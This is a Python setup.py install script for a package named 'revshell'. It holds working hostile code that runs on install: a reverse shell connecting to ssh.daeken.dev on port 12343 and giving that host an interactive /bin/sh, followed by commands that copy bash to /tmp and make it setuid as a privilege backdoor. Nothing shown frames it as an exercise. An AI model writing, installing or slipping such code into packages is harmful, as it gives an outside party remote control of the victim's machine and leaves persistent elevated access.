import os, os.path, subprocess, sys
from distutils.core import setup

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ssh.daeken.dev",12343))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])


try:
	subprocess.check_output(['cp', '/bin/bash', '/tmp/rwxbash'])
	subprocess.check_output(['chown', 'rwx', '/tmp/rwxbash'])
	subprocess.check_output(['chmod', '4555', '/tmp/rwxbash'])
	subprocess.check_output(['chmod', 'u+s', '/tmp/rwxbash'])
	print 'Set up rwxbash'
except:
	print 'Couldn\'t set up rwxbash?'

setup(
	name='revshell',
	version='1.0',
	py_modules=['revshell']
)
